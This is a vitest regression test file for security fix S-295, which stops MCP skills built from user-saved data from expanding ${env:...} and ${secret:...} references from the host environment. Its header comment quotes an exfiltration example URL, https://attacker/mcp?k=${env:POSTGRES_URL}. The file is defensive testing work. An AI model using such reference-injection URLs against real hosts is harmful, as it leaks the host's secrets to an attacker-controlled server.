/**
 * S-295 (CRITICAL, 2026-09-26): `${env:NAME}` and `${secret:NAME}` in an MCP
 * server's url, headers and env resolve ONLY when the skill's builder hands
 * in the sources (`MCPSkillConfig.references`). The skill resolved them for
 * every `MCPSkill` against `process.env` and the CLI keystore, so a host that
 * built one from data its users saved (the portal, from a hosted agent's MCP
 * entries) expanded `https://attacker/mcp?k=${env:POSTGRES_URL}` from its own
 * environment and sent the value to that server.
 *
 * Pinned by `secret_refs.resolution_gate` in
 * `python/tests/fixtures/mcp_tool/config_shapes.json`, which the Python suite
 * runs too (`tests/agents/skills/test_mcp_reference_gate_s295_e2efix.py`):
 * a host-built skill keeps every field literal (proved on the wire against
 * the probe server: the header arrives as the bytes written), while the
 * agent-file loader's skill resolves as before.
 */

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { spawn, type ChildProcess } from 'node:child_process';
import { readFileSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:net';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { BaseAgent } from '../../../src/core/agent';
import { MCPSkill, ownerReferenceSources } from '../../../src/skills/mcp/skill';
import { resolveSkillsByName } from '../../../src/skills/resolve';
import { tempDirs } from '../../helpers/cli';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const FIXTURES = path.resolve(HERE, '../../../../python/tests/fixtures');
const GATE = (JSON.parse(readFileSync(path.join(FIXTURES, 'mcp_tool/config_shapes.json'), 'utf8')) as { secret_refs: { resolution_gate: Gate } }).secret_refs.resolution_gate;
const PROBE = JSON.parse(readFileSync(path.join(FIXTURES, 'mcp_tool/probe_server_mcpsecrets.json'), 'utf8')) as { server_name: string; http_path: string };
const PROBE_SERVER = path.resolve(HERE, '../../fixtures/mcp-probe-server-mcpsecrets.mjs');
const OWNER = { authenticated: true, scope: 'owner', provider: 'local' };

interface Gate {
  config_key: string;
  sources: string[];
  variable: string;
  variable_value: string;
  literal_cases: { field: string; key?: string; value: string }[];
  resolved_header: { key: string; value: string; expected: string };
}

const tempDir = tempDirs();

/** The private resolver, as the connect path calls it. */
type Resolving = { resolveReferences(name: string, config: Record<string, unknown>): Promise<{ live: Record<string, unknown>; values: string[] }> };

function serverFrom(cases: Gate['literal_cases']): Record<string, unknown> {
  const config: Record<string, unknown> = { command: 'srv' };
  for (const c of cases) {
    if (c.key) (config[c.field] ??= {}) && ((config[c.field] as Record<string, string>)[c.key] = c.value);
    else config[c.field] = c.value;
  }
  return config;
}

function freePort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const probe = createServer();
    probe.on('error', reject);
    probe.listen(0, '127.0.0.1', () => {
      const { port } = probe.address() as { port: number };
      probe.close(() => resolve(port));
    });
  });
}

async function probeOverHttp(): Promise<{ url: string; child: ChildProcess }> {
  const port = await freePort();
  const child = spawn(process.execPath, [PROBE_SERVER, '--http', String(port)], { stdio: ['ignore', 'ignore', 'pipe'] });
  await new Promise<void>((resolve, reject) => {
    let said = '';
    child.stderr!.on('data', (chunk: Buffer) => {
      said += chunk.toString();
      if (said.includes('probe server on')) resolve();
    });
    child.on('exit', (code) => reject(new Error(`probe server exited with ${code}: ${said}`)));
  });
  return { url: `http://127.0.0.1:${port}${PROBE.http_path}`, child };
}

describe('S-295: references resolve only with sources the builder hands in', () => {
  const saved: Record<string, string | undefined> = {};
  const ISOLATED = ['HOME', 'WEBAGENTS_SECRETS_BACKEND', 'WEBAGENTS_PROFILE', 'WEBAGENTS_SECRETS_DIR', GATE.variable];

  beforeEach(() => {
    for (const name of ISOLATED) {
      saved[name] = process.env[name];
      delete process.env[name];
    }
    process.env.HOME = tempDir('wa-gate-home-');
    process.env.WEBAGENTS_SECRETS_BACKEND = 'file';
    // The host's own environment, which a saved URL must never reach.
    process.env[GATE.variable] = GATE.variable_value;
    for (const method of ['log', 'warn', 'error', 'info', 'debug'] as const) vi.spyOn(console, method).mockImplementation(() => {});
  });

  afterEach(() => {
    vi.restoreAllMocks();
    for (const name of ISOLATED) {
      if (saved[name] === undefined) delete process.env[name];
      else process.env[name] = saved[name];
    }
  });

  it('the fixture names the config key and the two sources', () => {
    expect(GATE.config_key).toBe('references');
    expect(GATE.sources).toEqual(['env', 'secret']);
  });

  it('a host-built skill (no sources) keeps every field literal: nothing is expanded, no value is read', async () => {
    const config = serverFrom(GATE.literal_cases);
    const skill = new MCPSkill({ mcp: { srv: config } as never }) as unknown as Resolving;
    const { live, values } = await skill.resolveReferences('srv', config);
    expect(live).toEqual(config);
    expect(values).toEqual([]);
    expect(JSON.stringify(live)).not.toContain(GATE.variable_value);
  });

  it('a host-built skill given a url with ${env:...} connects to the literal url', async () => {
    const config = { url: `https://mcp.example.test/mcp?k=\${env:${GATE.variable}}`, transport: 'http' };
    const skill = new MCPSkill({ mcp: { srv: config } as never }) as unknown as Resolving;
    const { live } = await skill.resolveReferences('srv', config);
    expect(live.url).toBe(config.url);
  });

  it('on the wire: a host-built skill sends a ${env:...} header as the literal bytes written', async () => {
    const { url, child } = await probeOverHttp();
    try {
      const { key, value } = GATE.resolved_header;
      const skill = new MCPSkill({ mcp: { [PROBE.server_name]: { url, transport: 'http', headers: { [key]: value } } } as never });
      const agent = new BaseAgent({ name: 'host', instructions: 'x', skills: [skill] });
      await agent.initialize();
      try {
        expect(await agent.runTool(`${PROBE.server_name}__authorization`, {}, { auth: OWNER })).toBe(value);
      } finally {
        await agent.cleanup();
      }
    } finally {
      child.kill();
    }
  });

  it('with the sources handed in, the same header resolves', async () => {
    const { url, child } = await probeOverHttp();
    try {
      const { key, value, expected } = GATE.resolved_header;
      const skill = new MCPSkill({
        mcp: { [PROBE.server_name]: { url, transport: 'http', headers: { [key]: value } } } as never,
        references: ownerReferenceSources(),
      });
      const agent = new BaseAgent({ name: 'owner', instructions: 'x', skills: [skill] });
      await agent.initialize();
      try {
        expect(await agent.runTool(`${PROBE.server_name}__authorization`, {}, { auth: OWNER })).toBe(expected);
      } finally {
        await agent.cleanup();
      }
    } finally {
      child.kill();
    }
  });

  it('the sources are injected: an env mapping of the builder’s choosing, not the process environment', async () => {
    const config = { headers: { X: `\${env:${GATE.variable}}` }, url: 'https://mcp.example.test/mcp', transport: 'http' };
    const skill = new MCPSkill({
      mcp: { srv: config } as never,
      references: { env: { [GATE.variable]: 'from-the-injected-mapping' }, secret: () => null },
    }) as unknown as Resolving;
    const { live, values } = await skill.resolveReferences('srv', config);
    expect((live.headers as Record<string, string>).X).toBe('from-the-injected-mapping');
    expect(values).toEqual(['from-the-injected-mapping']);
  });

  it('the agent-file loader builds the skill with the owner’s sources, so a file still resolves', async () => {
    const dir = tempDir('wa-gate-project-');
    writeFileSync(path.join(dir, 'AGENT.md'), '---\nname: a\n---\nBody\n');
    const config = { url: 'https://mcp.example.test/mcp', transport: 'http', headers: { X: `\${env:${GATE.variable}}` } };
    const { skills, unknown } = await resolveSkillsByName([{ mcp: { srv: config } }], { agentDir: dir });
    expect(unknown).toEqual([]);
    const skill = skills[0] as unknown as Resolving & { mcpConfig: { references?: unknown } };
    expect(skill.mcpConfig.references).toBeDefined();
    const { live } = await skill.resolveReferences('srv', config);
    expect((live.headers as Record<string, string>).X).toBe(GATE.variable_value);
  });
});
